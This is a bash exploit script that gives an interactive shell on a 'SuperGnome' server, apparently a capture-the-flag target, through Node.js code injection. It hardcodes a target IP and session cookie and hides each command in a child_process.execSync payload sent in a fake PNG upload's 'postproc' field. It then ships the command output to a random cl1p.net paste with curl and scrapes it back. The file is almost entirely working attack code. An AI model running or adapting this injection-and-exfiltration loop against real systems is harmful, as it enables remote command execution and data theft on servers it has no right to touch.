#!/bin/bash
# @Author: caleb
# @Date:   2015-12-14 10:41:57
# @Last Modified by:   caleb
# @Last Modified time: 2015-12-14 15:04:48
#
# This script will run a command using NodeJS injection on the SuperGnome server.
# You may specify a filename to send (although it isn't actually uploaded).
# You can also specify a host, but the only host that I know of which is working
# is already specified. You also need a valid sessionid, which can be found by
# logging into the SuperGnome in chrome or firefox and pulling sessionid cookie
# value out of the browser. It's simpler than trying to login with curl. The cookie
# will remain valid indefinitely while you keep using it, so you should be fine.

host="52.192.152.132"
session="1sEDrZT9781vzfRSqZvw"

while getopts h:c:s: opt; do
	case $opt in
		h)
			host=$OPTARG
			;;
		s)
			session=$OPTARG
			;;
		\?)
			echo "usage: $0 -h [host] -s [sessionid]"
			exit
			;;
	esac
done

# Create our cookie from the session id
echo "$host	FALSE	/	FALSE	0	sessionid	$session" > ./.cookies.txt
# 
echo "PNG IMAGE" > ./.fake.png
# Generate a random cl1p name
cl1p="https://cl1p.net/`head /dev/urandom | sha256sum | head -c 20`"

echo "Starting Node.js injection shell..."
echo "Using cl1p: $cl1p"

echo -n "bash$ "
while read line; do
	if [ "$line" = "exit" ]; then
		echo "Exiting injection shell..."
		rm ./.fake.png
		rm ./.cookies.txt
		rm ./.inject.out
		exit
	fi
	if [[ $line == -* ]]; then
		no_out="true"
		line=`echo $line | sed 's/^-//'`
		echo "note: not reading output!"
	else
		no_out="false"
	fi
	echo "Executing \"$line\"..."
	jsinject="require('child_process').execSync('curl -F content=\"\`$line 2>&1\`\" $cl1p')"
	curl -b ./.cookies.txt -X POST -F "file=@./.fake.png;type=image/png" -F "postproc=$jsinject" http://$host/files > ./.inject.out 2>/dev/null
	if [ -n "`grep "Post process result" ./.inject.out`" ]; then
		echo "Command executed."
	else
		echo "Command failed."
	fi

	if [ "$no_out" = "false" ]; then
		sleep 2
		curl $cl1p 2>/dev/null | tr "\n" "|" | grep -o "<textarea name=\"content\">[^<]*</textarea>" | sed "s:<textarea name=\"content\">\([^<]*\)</textarea>:\1:" | tr "|" "\n"
	fi

	echo -n "bash$ "
done
